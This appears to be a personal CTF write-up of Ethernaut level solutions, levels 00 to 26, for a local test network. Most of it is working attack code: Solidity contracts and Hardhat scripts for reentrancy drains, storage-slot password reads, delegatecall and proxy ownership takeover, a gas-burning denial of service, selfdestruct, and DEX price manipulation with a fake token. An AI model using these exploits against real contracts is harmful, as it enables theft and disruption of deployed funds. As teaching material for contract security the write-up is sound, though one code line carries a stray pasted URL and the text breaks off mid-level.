# Ethernaut

## Local setup

```sh
# Install nvm

git clone https://github.com/OpenZeppelin/ethernaut.git
cd ethernaut

nvm install # Use the version specified in .nvmrc
nvm use
npm install --global yarn
yarn install

# Launch a local network (in a separate shell) with `yarn network`
# Import one of the private keys into MetaMask

# Verify ACTIVE_NETWORK = NETWORKS.LOCAL in client/src/constants.js
yarn deploy:contracts
# It may be necessary to explicitly change http://localhost to http://127.0.0.1 in client/src/constants.js
# (Most /etc/hosts include an ipv6 entry for localhost which can apparently cause problems)
yarn start:ethernaut
```

## 00 Hello Ethernaut

```js
await contract.info()
await contract.info1()
await contract.info2("hello")

// Can tell infoNum() returns a uint8 from contract.abi
(await contract.infoNum()).toString()

await contract.info42()
await contract.theMethodName()
await contract.method7123949()
await contract.password()
await contract.authenticate("ethernaut0")
```

## 01 Fallback

```js
(await contract.contributions(await contract.owner())).toString()
await contract.contribute({value: 1})
(await contract.contributions(player)).toString()
await sendTransaction({to: contract.address, from: player, value: 1})
await contract.owner() == player
await contract.withdraw()
await getBalance(contract.address) == 0
```

## 02 Fallout

```js
// The Fal1out (sp) function is not a constructor
await contract.owner()
await contract.Fal1out()
await contract.owner() == player
```

## 03 Coin Flip

Create a Hardhat project

```sh
mkdir 03-coin-flip
cd 03-coin-flip
npm init -y
npm install -D hardhat
npx hardhat # Create a JavaScript project
```

With the following contract

```sol
pragma solidity ^0.8.0;

interface ICoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
  ICoinFlip public target;

  constructor(address _target) {
    target = ICoinFlip(_target);
  }

  function attack() external {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    bool side = coinFlip == 1 ? true : false;
    target.flip(side);
  }
}
```

Compile with `npx hardhat compile`

Create a deploy/execute script (as scripts/deploy.js)

```js
const hre = require("hardhat");

async function main() {
  const target = "<target contract address>";
  const contract = await hre.ethers.deployContract("CoinFlipAttack", [target]);
  await contract.waitForDeployment();
  console.log(`Contract address: ${await contract.getAddress()}`);

  for (let i=0; i<10; i++) {
    (await contract.attack()).wait();
    console.log(`Attack ${i+1} complete`);
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

Include the local network in hardhat.config.js

```js
module.exports = {
  // ...
  networks: {
    ethernaut: {
      url: "http://127.0.0.1:8545",
      chainId: 1337,
      accounts: ["<private key>"]
    }
  }
}
```

Deploy/execute the contract with `npx hardhat run scripts/deploy.js --network ethernaut`

Can verify with `await contract.consecutiveWins() == 10` in the Ethernaut Javascript console

Note that when submitting the instance in the Ethernaut interface will need to update the nonce used by MetaMask since transactions occurred using Hardhat.  Enable this for the account in Settings, Advanced, Customize transaction nonce.

## 04 Telephone

Ref: https://ethereum.stackexchange.com/a/1892

```sol
pragma solidity ^0.8.0;

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract TelephoneAttack {
  ITelephone public target;

  constructor(address _target) {
    target = ITelephone(_target);
  }

  function attack() external {
    target.changeOwner(tx.origin);
  }
}
```

## 05 Token

```js
(await contract.balanceOf(player)).toString()
(await contract.balanceOf(level)).toString()

// Must send to another address (ie not player) otherwise underflow effects will be negated
await contract.transfer(level, 21)

(await contract.balanceOf(player)).toString()
(await contract.balanceOf(level)).toString()
```

## 06 Delegation

In `npx hardhat console` execute `(new hre.ethers.Interface(["function pwn()"])).encodeFunctionData("pwn")` to get 0xdd365b8b

```js
await sendTransaction({to: contract.address, from: player, data: "0xdd365b8b"})
await contract.owner == player
```

## 07 Force

```sol
pragma solidity ^0.8.0;

contract ForceAttack {
  constructor(address payable target) payable {
    require(msg.value > 0);
    selfdestruct(target);
  }
}
```

Remember to include at least one wei with the deployment, ie `const contract = await hre.ethers.deployContract("ForceAttack", [target], {value: 1});`

Verify with `await getBalance(contract.address) > 0` in the Ethernaut Javascript console

## 08 Vault

```js
const hre = require("hardhat");

async function main() {
  const target = "<target contract address>";
  const value = await hre.ethers.provider.getStorage(target, 1);
  console.log(`value = ${value}`);
  console.log(`password = "${Buffer.from(value.substring(2), 'hex')}"`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

```js
// The unlock function expects a bytes32 not a string ("A very strong secret password :)")
await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
await contract.locked() == false
```

## 09 King

```sol
pragma solidity ^0.8.0;

contract KingAttack {
  address payable public target;

  constructor(address payable _target) {
    target = _target;
  }

  function attack() external payable {
    // Cannot use transfer because it does not provide sufficient gas (hardcoded at 2300)
    // Ref: https://medium.com/coinmonks/solidity-transfer-vs-send-vs-call-function-64c92cfc878a
    // target.transfer(msg.value);

    (bool sent,) = target.call{value: msg.value}("");
    require(sent);
  }

  receive() external payable {
    revert();
  }
}
```

```js
const hre = require("hardhat");

async function main() {
  const target = "<target contract address>";
  const contract = await hre.ethers.deployContract("KingAttack", [target]);
  await contract.waitForDeployment();
  console.log(`Contract address: ${await contract.getAddress()}`);
  // One wei more than `await contract.prize()` from the Ethernaut Javascript console
  (await contract.attack({value: 1000000000000001})).wait();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 10 Re-entrancy

```sol
pragma solidity ^0.8.0;

interface IReentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract ReentranceAttack {
  IReentrance target;
    
  constructor(address _target) payable {
    target = IReentrance(_target);
  }

  function attack() external payable {
    target.donate{value: msg.value}(address(this));
    target.withdraw(msg.value);
  }

  receive() external payable {
    if (address(target).balance >= msg.value) {
      target.withdraw(msg.value);
    }
  }
}
```

```js
const hre = require("hardhat");

async function main() {
  const target = "<target contract address>";
  const balance = await hre.ethers.provider.getBalance(target);
  console.log(`Target balance = ${balance}`);
  const amount = balance / 10n;

  const contract = await hre.ethers.deployContract("ReentranceAttack", [target]);
  await contract.waitForDeployment();
  console.log(`Contract address: ${await contract.getAddress()}`);
  (await contract.attack({value: amount})).wait();
  console.log("Attack complete");

  console.log(`Target balance = ${await hre.ethers.provider.getBalance(target)}`);
  console.log(`Contract balance = ${await hre.ethers.provider.getBalance(await contract.getAddress())}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 11 Elevator

```sol
pragma solidity ^0.8.0;

interface IElevator {
  function goTo(uint _floor) external;
}

contract ElevatorAttack {
  uint calls;

  function isLastFloor(uint) external returns (bool) {
    calls++;
    return calls % 2 == 0;
  }

  function attack(address target) external {
    IElevator(target).goTo(1);
  }
}
```

```js
const hre = require("hardhat");

async function main() {
  const target = (await hre.ethers.getContractFactory("Elevator")).attach("<target contract address>");
  console.log(`Target top = ${await target.top()}`);

  const contract = await hre.ethers.deployContract("ElevatorAttack");
  await contract.waitForDeployment();
  console.log(`Contract address: ${await contract.getAddress()}`);
  (await contract.attack(await target.getAddress())).wait();
  console.log("Attack complete");
  console.log(`Target top = ${await target.top()}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 12 Privacy

```js
const hre = require("hardhat");

async function main() {
  const target = (await hre.ethers.getContractFactory("Privacy")).attach("<target contract address>");
  console.log(`Target locked = ${await target.locked()}`);
  
  // Each variable occupies one 256-bit slot.
  // Several contiguous variables that occupy less than 256 bits are packed.
  for (let i = 0; i < 6; i++)
    console.log(`slot ${i}: ${await hre.ethers.provider.getStorage(await target.getAddress(), i)}`);

  const key = (await hre.ethers.provider.getStorage(await target.getAddress(), 5)).toString().substring(0, 2 + 32);
  console.log(`key = ${key}`);

  (await target.unlock(key)).wait();
  console.log(`Target locked = ${await target.locked()}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 13 Gatekeeper One

```sol
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IGatekeeperOne {
  function enter(bytes8 _gateKey) external;
}

contract GatekeeperOneAttack {
  function attack(address target, bytes8 gateKey, uint256 gas) external {
    // Note that console.log output will appear in the `yarn network` output.
    // Ref: https://hardhat.org/hardhat-network/docs/reference#console.log
    // Output using console.logBytes{8,4} for hex output.
    console.logBytes8(gateKey);
    console.logBytes4(bytes4(uint32(uint64(gateKey))));
    console.logBytes2(bytes2(uint16(uint64(gateKey))));

    require(uint32(uint64(gateKey)) == uint16(uint64(gateKey)), "GatekeeperOne: invalid gateThree part one");
    require(uint32(uint64(gateKey)) != uint64(gateKey), "GatekeeperOne: invalid gateThree part two");
    require(uint32(uint64(gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");

    IGatekeeperOne(target).enter{gas: gas}(gateKey);
  }
}
```

```js
const hre = require("hardhat");

async function main() {
  const target = (await hre.ethers.getContractFactory("GatekeeperOne")).attach("<target contract address>");
  console.log(`Target entrant = ${await target.entrant()}`);

  const contract = await hre.ethers.deployContract("GatekeeperOneAttack");
  await contract.waitForDeployment();
  console.log(`Contract address: ${await contract.getAddress()}`);

  const gateKey = await (async () => {
    const [ signer ] = await hre.ethers.getSigners();
    return "0x" + (hre.ethers.toBigInt(signer.address) & 0xffffffff_0000ffffn).toString(16);
  })();
  console.log(`gateKey = ${gateKey}`);

  for (let i = 0; i < 8191; i++) {
    console.log(`Testing ${i} gas offset`);
    try {
      (await contract.attack(await target.getAddress(), gateKey, 100000 + i)).wait();
      break;
    } catch {
    }
  }
  console.log("Attack complete");
  console.log(`Target entrant = ${await target.entrant()}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 14 Gatekeeper Two

```sol
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
  function enter(bytes8 _gateKey) external;
}

contract GatekeeperTwoAttack {
  // Launching the attack from a constructor ensures extcodesize(caller()) == 0
  constructor(address target) {
    uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max;
    require(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ uint64(gateKey) == type(uint64).max);
    IGatekeeperTwo(target).enter(bytes8(gateKey));
  }
}
```

```js
const hre = require("hardhat");https://solidity-by-example.org/hacks/delegatecall/

async function main() {
  const target = (await hre.ethers.getContractFactory("GatekeeperTwo")).attach("<target contract address>");
  console.log(`Target entrant = ${await target.entrant()}`);

  const contract = await hre.ethers.deployContract("GatekeeperTwoAttack", [await target.getAddress()]);
  await contract.waitForDeployment();
  console.log(`Contract address: ${await contract.getAddress()}`);

  console.log(`Target entrant = ${await target.entrant()}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 15 Naught Coin

- Change the NaughtCoin.sol import to be `@openzeppelin/contracts/token/ERC20/ERC20.sol`
- Run `npm install @openzeppelin/contracts`

```js
const hre = require("hardhat");

async function main() {
  const target = (await hre.ethers.getContractFactory("NaughtCoin")).attach("<target contract address>");

  const [ signer ] = await hre.ethers.getSigners();
  console.log(`Player address = ${signer.address}`);

  const balance = await target.balanceOf(signer.address);
  console.log(`Player balance = ${balance}`);

  // Note that the spender (first argument) here is the owner
  await target.approve(signer.address, balance);
  await target.transferFrom(signer.address, await target.getAddress() /* Or any address */, balance);
  console.log("Attack complete");

  console.log(`Player balance = ${await target.balanceOf(signer.address)}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 16 Preservation

```sol
pragma solidity ^0.8.0;

interface IPreservation {
  function setFirstTime(uint _timeStamp) external;
}

contract PreservationAttack {
  function attack(address target, address _library) external {
    // When using delegatecall the library and calling contract are expected to have the same state variable layout.
    // However LibraryContract's first state variable is storedTime and Preservation's is timeZone1Library,
    // so Preservation.setFirstTime() causes Preservation's first state variable (timeZone1Library) to be overwritten.
    // Ref: https://solidity-by-example.org/hacks/delegatecall/
    IPreservation(target).setFirstTime(uint(uint160(_library)));

    IPreservation(target).setFirstTime(0 /* Any value */);
  }
}

contract PreservationAttackLibrary {
  // Match the state variable layout of Preservation
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;

  function setTime(uint _time) public {
    owner = tx.origin;
  }
}
```

```js
const hre = require("hardhat");

async function main() {
  const target = (await hre.ethers.getContractFactory("Preservation")).attach("<target contract address>");
  console.log(`Target owner = ${await target.owner()}`);

  const library = await hre.ethers.deployContract("PreservationAttackLibrary");
  await library.waitForDeployment();
  console.log(`Library address: ${await library.getAddress()}`);

  const contract = await hre.ethers.deployContract("PreservationAttack");
  await contract.waitForDeployment();
  console.log(`Contract address: ${await contract.getAddress()}`);

  (await contract.attack(await target.getAddress(), await library.getAddress())).wait();
  console.log("Attack complete");

  console.log(`Target owner = ${await target.owner()}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 17 Recovery

```js
const hre = require("hardhat");

async function main() {
  const target = "<target contract address>";
  // Contract addresses are deterministic given the sender address and nonce (transaction number)
  const token = (await hre.ethers.getContractFactory("SimpleToken")).attach(hre.ethers.getCreateAddress({from:target, nonce:1}));
  console.log(`SimpleToken contract address: ${await token.getAddress()}`);
  console.log(`SimpleToken contract balance: ${await hre.ethers.provider.getBalance(await token.getAddress())}`);

  const [ signer ] = await hre.ethers.getSigners();
  console.log(`Player address: ${signer.address}`);
  (await token.destroy(signer.address)).wait();
  console.log("Attack complete");
  console.log(`SimpleToken contract balance: ${await hre.ethers.provider.getBalance(await token.getAddress())}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 18 MagicNumber

```js
const hre = require("hardhat");

async function main() {
  // Contract creation bytecode contains initialization code followed by runtime code.
  // Ref: https://ethervm.io/

  // Runtime code (exactly 10 bytes):
  // | Assembly | Bytecode | Notes                                                       |
  // | -------- | -------- | ----------------------------------------------------------- |
  // | push1 42 | 0x602a   | Pushes 42 onto the stack, stack width is 256 bits           |
  // | push1 0  | 0x6000   | Pushes 0 onto the stack                                     |
  // | mstore   | 0x52     | Stores a 256-bit value in memory (offset, value from stack) |
  // | push1 32 | 0x6020   | Pushes 32 onto the stack                                    |
  // | push1 0  | 0x6000   | Pushes 0 onto the stack                                     |
  // | return   | 0xf3     | Return value from memory (offset, length from stack)        |

  // Initialization code:
  // | Assembly | Bytecode | Notes                                                                            |
  // | -------- | -------- | -------------------------------------------------------------------------------- |
  // | push1 10 | 0x600a   | Pushes 10 onto the stack                                                         |
  // | push1 12 | 0x600c   | Pushes 12 onto the stack                                                         |
  // |          |          | This offset depends on the length of the initialization code (12 byte),          |
  // |          |          | and won't be known until after the rest of it has been written                   |
  // | push1 0  | 0x6000   | Pushes 0 onto the stack                                                          |
  // | codecopy | 0x39     | Copy executing bytecode into memory (dest offset, src offset, length from stack) |
  // | push1 10 | 0x600a   | Pushes 10 onto the stack                                                         |
  // | push1 0  | 0x6000   | Pushes 0 onto the stack                                                          |
  // | return   | 0xf3     | Return value from memory (offset, length from stack)                             |

  const bytecode = "0x600a600c600039600a6000f3602a60005260206000f3";
  const [ signer ] = await hre.ethers.getSigners();
  const contract = (await (await signer.sendTransaction({from:signer.address, data:bytecode})).wait()).contractAddress;
  console.log(`Contract address: ${contract}`);

  const target = (await hre.ethers.getContractFactory("MagicNum")).attach("<target contract address>");
  (await target.setSolver(contract)).wait();
  console.log("Attack complete");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 19 Alien Codex

- Change the AlienCodex.sol import to be `@openzeppelin/contracts/ownership/Ownable.sol`
- Run `npm install @openzeppelin/contracts@v2.5.0`
- Change the Solidity version to 0.5.17 in hardhat.config.js

```js
const hre = require("hardhat");

async function main() {
  // Storage variable layout: Ownable's (address owner) then AlienCodex's (bool contact, bytes32[] codex)
  // Ref: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/ownership/Ownable.sol
  // The 20-byte owner address and 1-byte contact bool are stored in the zeroth slot.
  // For dynamic arrays (bytes32[] codex) the next slot stores the number of elements in the array
  // and the array data itself starting at keccak256(<slot number>)
  // Ref: https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html#mappings-and-dynamic-arrays
  // Note that slots for array data wraps around after reaching the maximum storage slot of (2**256)-1
  const targetAddress = "<target contract address>";
  console.log(`Target slot 0: ${await hre.ethers.provider.getStorage(targetAddress, 0)}`);
  console.log(`Target slot 1: ${await hre.ethers.provider.getStorage(targetAddress, 1)}`);

  // Note that the value specified here must be the full 256-bit (string) value
  const firstSlot = hre.ethers.toBigInt(hre.ethers.keccak256("0x0000000000000000000000000000000000000000000000000000000000000001"));
  console.log(`Target codex index 0 slot: ${firstSlot}`);
  const ownerIndex = (2n ** 256n) - firstSlot;
  console.log(`Target codex index at slot 0: ${ownerIndex}`);

  const targetContract = (await hre.ethers.getContractFactory("AlienCodex")).attach(targetAddress);
  console.log(`Target owner: ${await targetContract.owner()}`);

  const value = await (async () => {
    const [ signer ] = await hre.ethers.getSigners();
    return "0x000000000000000000000000" + hre.ethers.toBigInt(signer.address).toString(16);
  })();

  (await targetContract.makeContact()).wait();

  // Underflow the size of the codex to cover all the storage slots
  (await targetContract.retract()).wait();

  (await targetContract.revise(ownerIndex, value)).wait();
  console.log("Attack complete");

  console.log(`Target slot 0: ${await hre.ethers.provider.getStorage(targetAddress, 0)}`);
  console.log(`Target owner: ${await targetContract.owner()}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 20 Denial

```sol
pragma solidity ^0.8.0;

contract DenialAttack {
  receive() external payable {
    // Consume all the gas
    while (true) {}

    // Note that prior to Solidity 0.8.0 a Panic (say via assert or division by zero) would consume all the gas
    // Ref: https://docs.soliditylang.org/en/latest/control-structures.html#error-handling-assert-require-revert-and-exceptions
  }
}
```

```js
const hre = require("hardhat");

async function main() {
  const target = (await hre.ethers.getContractFactory("Denial")).attach("<target contract address>");

  const contract = await hre.ethers.deployContract("DenialAttack");
  await contract.waitForDeployment();
  console.log(`Contract address: ${await contract.getAddress()}`);

  (await target.setWithdrawPartner(await contract.getAddress())).wait();
  (await target.withdraw()).wait();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 21 Shop

```sol
pragma solidity ^0.8.0;

interface IShop {
  function buy() external;
  function isSold() external returns (bool);
}

contract ShopAttack {
  address target;

  constructor(address _target) {
    target = _target;
  }

  function price() external returns (uint) {
    // The Buy interface has the view modifier, preventing state modification
    //calls++;
    //return calls % 2 == 1 ? 100 : 0;

    return IShop(target).isSold() ? 0 : 100;
  }

  function attack() external {
    IShop(target).buy();
  }
}
```

```js
const hre = require("hardhat");

async function main() {
  const target = (await hre.ethers.getContractFactory("Shop")).attach("<target contract address>");
  console.log(`Target price, isSold = ${await target.price()}, ${await target.isSold()}`);

  const contract = await hre.ethers.deployContract("ShopAttack", [await target.getAddress()]);
  await contract.waitForDeployment();
  console.log(`Contract address: ${await contract.getAddress()}`);
  (await contract.attack()).wait();
  console.log("Attack complete");

  console.log(`Target price, isSold = ${await target.price()}, ${await target.isSold()}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 22 Dex

- Change the Dex.sol imports to be
  - `@openzeppelin/contracts/token/ERC20/IERC20.sol`
  - `@openzeppelin/contracts/token/ERC20/ERC20.sol`
  - `@openzeppelin/contracts/access/Ownable.sol`
- Run `npm install @openzeppelin/contracts`

```js
const hre = require("hardhat");

async function main() {
  const targetAddress = "<target contract address>";
  const targetContract = (await hre.ethers.getContractFactory("Dex")).attach(targetAddress);
  const [ token1, token2 ] = [ await targetContract.token1(), await targetContract.token2() ];

  const [ signer ] = await hre.ethers.getSigners();

  const calculateAmounts = async fromToken1 => {
    const [ fromToken, toToken ] = fromToken1 ? [ token1, token2 ] : [ token2, token1 ];
    const playerFromBalance = await targetContract.balanceOf(fromToken, signer.address);
    const contractFromBalance = await targetContract.balanceOf(fromToken, targetAddress);
    const contractToBalance = await targetContract.balanceOf(toToken, targetAddress);

    const amount = playerFromBalance < contractFromBalance ? playerFromBalance : contractFromBalance;
    const swapAmount = amount * contractToBalance / contractFromBalance; // BigInt integer division
    return [ amount, swapAmount ];
  };

  while ((await targetContract.balanceOf(token1, targetAddress)) > 0 &&
         (await targetContract.balanceOf(token1, targetAddress)) > 0)
  {
    const [ amount1, swapAmount1 ] = await calculateAmounts(true);

    console.log(
      "Target, Player, amount, swapAmount = " +
      `${await targetContract.balanceOf(token1, targetAddress)} ${await targetContract.balanceOf(token2, targetAddress)}, ` +
      `${await targetContract.balanceOf(token1, signer.address)} ${await targetContract.balanceOf(token2, signer.address)}, ` +
      `${amount1} ${swapAmount1}`
    );

    (await targetContract.approve(targetAddress, amount1)).wait();
    (await targetContract.swap(token1, token2, amount1)).wait();

    const [ amount2, swapAmount2 ] = await calculateAmounts(false);

    console.log(
      "Target, Player, amount, swapAmount = " +
      `${await targetContract.balanceOf(token1, targetAddress)} ${await targetContract.balanceOf(token2, targetAddress)}, ` +
      `${await targetContract.balanceOf(token1, signer.address)} ${await targetContract.balanceOf(token2, signer.address)}, ` +
      `${amount2} ${swapAmount2}`
    );

    (await targetContract.approve(targetAddress, amount2)).wait();
    (await targetContract.swap(token2, token1, amount2)).wait();
  }

  console.log(
    "Target, Player = " +
    `${await targetContract.balanceOf(token1, targetAddress)} ${await targetContract.balanceOf(token2, targetAddress)}, ` +
    `${await targetContract.balanceOf(token1, signer.address)} ${await targetContract.balanceOf(token2, signer.address)}`,
  );
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 23 Dex Two

- Change the DexTwo.sol imports to be
  - `@openzeppelin/contracts/token/ERC20/IERC20.sol`
  - `@openzeppelin/contracts/token/ERC20/ERC20.sol`
  - `@openzeppelin/contracts/access/Ownable.sol`
- Run `npm install @openzeppelin/contracts`

```sol
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract FakeToken is ERC20 {
  bool targetToken1;

  constructor(string memory name, string memory symbol, address _dex) ERC20(name, symbol) {
    _mint(msg.sender, 2); // Only two transfers required
    targetToken1 = true;
  }

  function switchTargets() public {
    targetToken1 = !targetToken1;
  }

  function balanceOf(address account) public view override returns(uint256) {
    // In order for DexTwo.getSwapAmount to return the full balance, return a value such that:
    //   amount * balance / retval => balance, where amount = 1
    return 1;
  }
}
```

```js
const hre = require("hardhat");

async function main() {
  const targetAddress = "<target contract address>";
  const targetContract = (await hre.ethers.getContractFactory("DexTwo")).attach(targetAddress);
  const [ token1, token2 ] = [ await targetContract.token1(), await targetContract.token2() ];

  const contract = await hre.ethers.deployContract("FakeToken", ["FakeToken", "F", targetAddress]);
  await contract.waitForDeployment();
  console.log(`Contract address: ${await contract.getAddress()}`);

  const [ signer ] = await hre.ethers.getSigners();

  console.log(
    "Target, Player = " +
    `${await targetContract.balanceOf(token1, targetAddress)} ${await targetContract.balanceOf(token2, targetAddress)}, ` +
    `${await targetContract.balanceOf(token1, signer.address)} ${await targetContract.balanceOf(token2, signer.address)}`
  );

  (await contract.approve(targetAddress, 1)).wait();
  (await targetContract.approve(targetAddress, 1)).wait();
  (await targetContract.swap(await contract.getAddress(), token1, 1)).wait();
  
  console.log(
    "Target, Player = " +
    `${await targetContract.balanceOf(token1, targetAddress)} ${await targetContract.balanceOf(token2, targetAddress)}, ` +
    `${await targetContract.balanceOf(token1, signer.address)} ${await targetContract.balanceOf(token2, signer.address)}`
  );

  (await contract.switchTargets()).wait();
  (await contract.approve(targetAddress, 1)).wait();
  (await targetContract.approve(targetAddress, 1)).wait();
  (await targetContract.swap(await contract.getAddress(), token2, 1)).wait();

  console.log(
    "Target, Player = " +
    `${await targetContract.balanceOf(token1, targetAddress)} ${await targetContract.balanceOf(token2, targetAddress)}, ` +
    `${await targetContract.balanceOf(token1, signer.address)} ${await targetContract.balanceOf(token2, signer.address)}`
  );
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 24 Puzzle Wallet

- Get the UpgradeableProxy-08.sol file from the ethernaut checkout in `ethernaut/contracts/contracts/helpers/`
  - Change its imports to be
    - `@openzeppelin/contracts/proxy/Proxy.sol`
    - `@openzeppelin/contracts/utils/Address.sol`
- Run `npm install @openzeppelin/contracts`

```js
const hre = require("hardhat");

async function main() {
  const proxyAddress = "<target contract address>";
  const proxyContract = (await hre.ethers.getContractFactory("PuzzleProxy")).attach(proxyAddress);
  const walletContract = (await hre.ethers.getContractFactory("PuzzleWallet")).attach(proxyAddress);

  console.log(`Slot 0: Proxy pendingAdmin / Wallet owner = ${await proxyContract.pendingAdmin()} ${await walletContract.owner()}`);
  console.log(`Slot 1: Proxy admin / Wallet maxBalance = ${await proxyContract.admin()} ${await walletContract.maxBalance()}`);

  console.log("Overwriting the Proxy pendingAdmin / Wallet owner");
  const [ signer ] = await hre.ethers.getSigners();
  (await proxyContract.proposeNewAdmin(signer.address)).wait();

  console.log(`Slot 0: Proxy pendingAdmin / Wallet owner = ${await proxyContract.pendingAdmin()} ${await walletContract.owner()}`);

  // Want to execute PuzzleWallet.setMaxBalance() (to overwrite the Wallet maxBalance / Proxy admin storage value).
  // This first requires that the PuzzleWallet.balance is zero.
  // Which requires executing PuzzleWallet.execute().
  // Which requires manipulating the value of PuzzleWallet.balances[msg.sender]
  // (Cannot use PuzzleWallet.deposit() directly as it would increase the PuzzleWallet.balance).

  // Can use PuzzleWallet.multicall() to call PuzzleWallet.deposit() twice,
  // that way the value of PuzzleWallet.balances[msg.sender] is increased twice.
  // However cannot call directly deposit() from multicall() twice due to the depositCalled guard,
  // so will call deposit(), then another multicall() that itself calls deposit().
  
  (await walletContract.addToWhitelist(signer.address)).wait();

  console.log(
    "Wallet balance, Wallet balances[player] = " +
    `${await hre.ethers.provider.getBalance(proxyAddress)}, ` +
    `${await walletContract.balances(signer.address)}`
  );

  (await walletContract.multicall([
    walletContract.interface.encodeFunctionData("deposit"),
    walletContract.interface.encodeFunctionData("multicall", [[walletContract.interface.encodeFunctionData("deposit")]])
  ], {value: await hre.ethers.provider.getBalance(proxyAddress)})).wait();

  console.log(
    "Wallet balance, Wallet balances[player] = " +
    `${await hre.ethers.provider.getBalance(proxyAddress)}, ` +
    `${await walletContract.balances(signer.address)}`
  );

  (await walletContract.execute(signer.address, await hre.ethers.provider.getBalance(proxyAddress), "0x")).wait();
  console.log(`Wallet balance = ${await hre.ethers.provider.getBalance(proxyAddress)}`);

  (await walletContract.setMaxBalance(signer.address)).wait();

  console.log(`Slot 1: Proxy admin / Wallet maxBalance = ${await proxyContract.admin()} ${await walletContract.maxBalance()}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 25 Motorbike

- Change the Motorbike.sol imports to be
  - `@openzeppelin/contracts/utils/Address.sol`
  - `@openzeppelin/contracts/proxy/Initializable.sol`
- Run `npm install @openzeppelin/contracts@v3.4.2`
- Change the Solidity version to 0.6.12 in hardhat.config.js

```sol
pragma solidity <0.7.0;

contract EngineAttack {
  function destroy() external {
    selfdestruct(address(0));
  }
}
```

```js
const hre = require("hardhat");

async function main() {
  const bikeAddress = "<target contract address>";
  console.log(`Motorbike: Slot 0: Initializable.{initialized,initializing}, Engine.upgrader = ${await hre.ethers.provider.getStorage(bikeAddress, 0)}`);

  const engineAddress = await (async () => {
    const slot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbcn;
    return "0x" + (await hre.ethers.provider.getStorage(bikeAddress, slot)).substring(26);
  })();
  console.log(`Engine: Slot 0: Initializable.{initialized,initializing}, Engine.upgrader = ${await hre.ethers.provider.getStorage(engineAddress, 0)}`);

  // Engine.initialize() has been called using delegatecall modifying the storage slots of Motorbike.
  // However it has not been run against the underlying Engine contract.

  const engineContract = (await hre.ethers.getContractFactory("Engine")).attach(engineAddress);
  (await engineContract.initialize()).wait();
  console.log(`Engine: Slot 0: Initializable.{initialized,initializing}, Engine.upgrader = ${await hre.ethers.provider.getStorage(engineAddress, 0)}`);

  const attackContract = await hre.ethers.deployContract("EngineAttack");
  await attackContract.waitForDeployment();
  console.log(`EngineAttack address: ${await attackContract.getAddress()}`);

  console.log(`EngineAttack horsePower = ${await engineContract.horsePower()}`);

  (await engineContract.upgradeToAndCall(
    await attackContract.getAddress(),
    (new hre.ethers.Interface(["function destroy()"])).encodeFunctionData("destroy")
  )).wait();

  // Verify the Engine contract has selfdestructed (this should raise an exception)
  console.log(`EngineAttack horsePower = ${await engineContract.horsePower()}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

## 26 DoubleEntryPoint

- Change the DoubleEntryPoint.sol imports to be
  - `@openzeppelin/contracts/token/ERC20/ERC20.sol`
  - `@openzeppelin/contracts/access/Ownable.sol`
- Run `npm install @openzeppelin/contracts`

```sol
pragma solidity ^0.8.0;

import "./DoubleEntryPoint.sol";

contract DetectionBot {
  address cryptoVault;

  constructor(address _cryptoVault) {
    cryptoVault = _cryptoVault;
  }

  function handleTransaction(address user, bytes calldata msgData) external {
    // Only DoubleEntryPoint.delegateTransfer has the fortaNotify modifier,
    // ie no need to check the 4-byte function selector here
    (,, address origSender) = abi.decode(msgData[4:], (address, uint256, address));
    if (origSender == cryptoVault)
      IForta(msg.sender).raiseAlert(user);
  }
}
```

```js
const hre = require("hardhat");

async function main() {
  const doubleEntryPoint = (await hre.ethers.getContractFactory("DoubleEntryPoint")).attach("<target contract address>");
  const cryptoVault = (await hre.ethers.getContractFactory("CryptoVault")).attach(await doubleEntryPoint.cryptoVault());
  const legacyToken = (await hre.ethers.getContractFactory("LegacyToken")).attach(await doubleEntryPoint.delegatedFrom());

  console.log(`CryptoVault underlying == DoubleEntryPoint = ${await cryptoVault.underlying() == await doubleEntryPoint.getAddress()}`);
  console.log(`LegacyToken delegate == DoubleEntryPoint = ${await legacyToken.delegate() == await doubleEntryPoint.getAddress()}`);

  // The vulnerability is that calling CryptoToken.sweepToken with LegacyToken causes DoubleEntryPoint tokens to be swept:
